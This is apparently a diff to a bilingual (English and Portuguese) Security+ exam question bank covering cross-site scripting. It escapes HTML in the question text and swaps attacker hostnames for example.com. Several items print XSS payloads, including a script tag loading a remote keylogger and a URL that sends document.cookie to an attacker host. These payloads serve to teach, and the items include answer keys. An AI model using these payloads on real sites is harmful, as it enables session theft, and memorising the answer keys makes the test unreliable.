@@ -42577,7 +42577,7 @@ const Q=[
     "id": "l030_q6",
     "t": "secplus",
     "d": "d2",
-    "q": "A developer is building a forum where users submit posts that other users will read. To prevent users from injecting <script> tags into their posts and executing code in other users' browsers, the developer must ensure user-submitted text is rendered as literal characters rather than executable HTML. Which technique achieves this?",
+    "q": "A developer is building a forum where users submit posts that other users will read. To prevent users from injecting &lt;script&gt; tags into their posts and executing code in other users' browsers, the developer must ensure user-submitted text is rendered as literal characters rather than executable HTML. Which technique achieves this?",
     "o": [
       "Input length validation",
       "Blocking all special characters in user input",
@@ -42586,7 +42586,7 @@ const Q=[
     ],
     "c": 2,
     "e": "Output encoding (also called HTML escaping) converts dangerous characters like <, >, ', \", and & into their HTML entities (&lt;, &gt;, etc.) so the browser renders them as text rather than interpreting them as code. Length validation is irrelevant to script injection. Blocking all special characters is too restrictive and breaks legitimate content. Encryption protects data at rest but does not affect how the browser renders the content.",
-    "q_pt": "Um desenvolvedor está construindo um fórum onde usuários enviam posts que outros usuários lerão. Para evitar que usuários injetem tags <script> em seus posts e executem código nos navegadores de outros usuários, o desenvolvedor deve garantir que o texto enviado pelos usuários seja renderizado como caracteres literais em vez de HTML executável. Qual técnica alcança isso?",
+    "q_pt": "Um desenvolvedor está construindo um fórum onde usuários enviam posts que outros usuários lerão. Para evitar que usuários injetem tags &lt;script&gt; em seus posts e executem código nos navegadores de outros usuários, o desenvolvedor deve garantir que o texto enviado pelos usuários seja renderizado como caracteres literais em vez de HTML executável. Qual técnica alcança isso?",
     "o_pt": [
       "Validação de comprimento de entrada",
       "Bloquear todos os caracteres especiais na entrada do usuário",
@@ -42643,7 +42643,7 @@ const Q=[
     "id": "l030_q9",
     "t": "secplus",
     "d": "d2",
-    "q": "During a code review of an e-commerce search feature, a developer notices that the search term entered by the user is rendered into the results page using a template that interpolates the raw value directly into HTML (e.g., '<p>Results for: ${query}</p>'). A tester confirms that submitting <img src=x onerror=alert(1)> as the search term triggers an alert dialog. The malicious payload is not stored. Which vulnerability has the tester confirmed?",
+    "q": "During a code review of an e-commerce search feature, a developer notices that the search term entered by the user is rendered into the results page using a template that interpolates the raw value directly into HTML (e.g., '&lt;p&gt;Results for: ${query}&lt;/p&gt;'). A tester confirms that submitting &lt;img src=x onerror=alert(1)&gt; as the search term triggers an alert dialog. The malicious payload is not stored. Which vulnerability has the tester confirmed?",
     "o": [
       "SQL Injection",
       "Stored Cross-Site Scripting",
@@ -42652,7 +42652,7 @@ const Q=[
     ],
     "c": 2,
     "e": "The payload is not stored in any database — it is reflected back by the server in the immediate response to the search request. The lack of output encoding allows the browser to interpret the attacker-controlled HTML/JS, executing it. This is the textbook definition of Reflected XSS. SQL Injection would target backend databases via SQL syntax. Stored XSS would persist the payload in the database. CSRF would trick an authenticated user into performing actions; it does not execute injected JavaScript.",
-    "q_pt": "Durante uma revisão de código de uma funcionalidade de busca de e-commerce, um desenvolvedor percebe que o termo de busca inserido pelo usuário é renderizado na página de resultados usando um template que interpola o valor bruto diretamente no HTML (por exemplo, '<p>Resultados para: ${query}</p>'). Um tester confirma que submeter <img src=x onerror=alert(1)> como termo de busca dispara um diálogo de alerta. O payload malicioso não é armazenado. Qual vulnerabilidade o tester confirmou?",
+    "q_pt": "Durante uma revisão de código de uma funcionalidade de busca de e-commerce, um desenvolvedor percebe que o termo de busca inserido pelo usuário é renderizado na página de resultados usando um template que interpola o valor bruto diretamente no HTML (por exemplo, '&lt;p&gt;Resultados para: ${query}&lt;/p&gt;'). Um tester confirma que submeter &lt;img src=x onerror=alert(1)&gt; como termo de busca dispara um diálogo de alerta. O payload malicioso não é armazenado. Qual vulnerabilidade o tester confirmou?",
     "o_pt": [
       "SQL Injection",
       "Cross-Site Scripting Persistente (Stored)",
@@ -42665,7 +42665,7 @@ const Q=[
     "id": "l030_q10",
     "t": "secplus",
     "d": "d2",
-    "q": "A social network allows users to set a custom 'About Me' bio that is publicly visible on their profile pages. A user (or attacker) sets their bio to <script src='https://evil.example.com/keylogger.js'></script>. From that point forward, every visitor who views the profile executes the malicious script in their own browser session, with full access to that visitor's cookies and DOM. What is the classification of this attack?",
+    "q": "A social network allows users to set a custom 'About Me' bio that is publicly visible on their profile pages. A user (or attacker) sets their bio to &lt;script src='https://example.com/keylogger.js'&gt;&lt;/script&gt;. From that point forward, every visitor who views the profile executes the malicious script in their own browser session, with full access to that visitor's cookies and DOM. What is the classification of this attack?",
     "o": [
       "DOM-based XSS",
       "Stored (Persistent) XSS",
@@ -42674,7 +42674,7 @@ const Q=[
     ],
     "c": 1,
     "e": "The malicious payload is stored persistently in the user's profile field in the backend database and rendered to every visitor of that profile. This is Stored XSS, which is particularly dangerous because the attacker does not need to interact directly with victims — they only need victims to view the compromised page. DOM-based XSS would require client-side DOM manipulation. Reflected XSS requires the payload to be sent in a single request. LFI targets server-side file inclusion.",
-    "q_pt": "Uma rede social permite que os usuários definam uma bio 'Sobre Mim' personalizada que é publicamente visível em suas páginas de perfil. Um usuário (ou atacante) define sua bio como <script src='https://evil.example.com/keylogger.js'></script>. A partir desse ponto, cada visitante que visualiza o perfil executa o script malicioso em sua própria sessão de navegador, com acesso completo aos cookies e DOM desse visitante. Qual é a classificação deste ataque?",
+    "q_pt": "Uma rede social permite que os usuários definam uma bio 'Sobre Mim' personalizada que é publicamente visível em suas páginas de perfil. Um usuário (ou atacante) define sua bio como &lt;script src='https://example.com/keylogger.js'&gt;&lt;/script&gt;. A partir desse ponto, cada visitante que visualiza o perfil executa o script malicioso em sua própria sessão de navegador, com acesso completo aos cookies e DOM desse visitante. Qual é a classificação deste ataque?",
     "o_pt": [
       "XSS baseado em DOM",
       "XSS Persistente (Stored)",
@@ -60925,7 +60925,7 @@ const Q=[
     "id": "l030_q1",
     "t": "secplus",
     "d": "d2",
-    "q": "A security analyst at an online banking company is reviewing logs after a wave of phishing attacks. The phishing emails contain links formatted as https://bank.example.com/transfer?note=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>. When a victim clicks the link while authenticated, the bank's 'transfer confirmation' page reflects the 'note' parameter directly into the HTML response without sanitization, executing the attacker's JavaScript. Which type of XSS attack is being exploited?",
+    "q": "A security analyst at an online banking company is reviewing logs after a wave of phishing attacks. The phishing emails contain links formatted as https://bank.example.com/transfer?note=&lt;script&gt;document.location='https://example.com/steal?c='+document.cookie&lt;/script&gt;. When a victim clicks the link while authenticated, the bank's 'transfer confirmation' page reflects the 'note' parameter directly into the HTML response without sanitization, executing the attacker's JavaScript. Which type of XSS attack is being exploited?",
     "o": [
       "Reflected Cross-Site Scripting",
       "Stored Cross-Site Scripting",
@@ -60934,7 +60934,7 @@ const Q=[
     ],
     "c": 0,
     "e": "This is a classic Reflected XSS attack. The malicious payload is delivered through a crafted URL parameter and 'reflected' by the server in its HTTP response immediately, without being stored persistently. Execution requires the victim to click the malicious link while authenticated. Stored XSS would require the payload to be saved in a database (e.g., a forum post). DOM-based XSS would be processed entirely client-side without server reflection. Server-Side Template Injection is a different vulnerability class affecting template engines.",
-    "q_pt": "Um analista de segurança de um banco online está revisando logs após uma onda de ataques de phishing. Os e-mails de phishing contêm links no formato https://banco.exemplo.com/transferencia?nota=<script>document.location='https://atacante.com/roubar?c='+document.cookie</script>. Quando a vítima clica no link estando autenticada, a página de 'confirmação de transferência' do banco reflete o parâmetro 'nota' diretamente na resposta HTML sem sanitização, executando o JavaScript do atacante. Qual tipo de ataque XSS está sendo explorado?",
+    "q_pt": "Um analista de segurança de um banco online está revisando logs após uma onda de ataques de phishing. Os e-mails de phishing contêm links no formato https://banco.exemplo.com/transferencia?nota=&lt;script&gt;document.location='https://example.com/roubar?c='+document.cookie&lt;/script&gt;. Quando a vítima clica no link estando autenticada, a página de 'confirmação de transferência' do banco reflete o parâmetro 'nota' diretamente na resposta HTML sem sanitização, executando o JavaScript do atacante. Qual tipo de ataque XSS está sendo explorado?",
     "o_pt": [
       "Cross-Site Scripting Refletido",
       "Cross-Site Scripting Persistente (Stored)",
